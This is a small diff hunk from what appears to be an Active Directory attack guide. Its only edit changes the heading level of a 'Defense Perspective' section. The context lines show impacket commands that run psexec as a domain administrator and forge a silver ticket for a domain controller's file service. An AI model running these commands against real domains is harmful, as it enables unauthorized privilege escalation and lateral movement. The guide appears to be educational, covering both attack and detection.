@@ -223,7 +223,7 @@ impacket-psexec corp.local/administrator@10.10.0.5 -k -no-pass
 impacket-ticketer -nthash 'service_hash' -domain-sid S-1-5-21-XXXX -domain corp.local -spn cifs/dc01.corp.local -user-id 500 administrator
 ```
 
-## Defense Perspective
+### Defense Perspective
 
 ### Detecting Reconnaissance
 
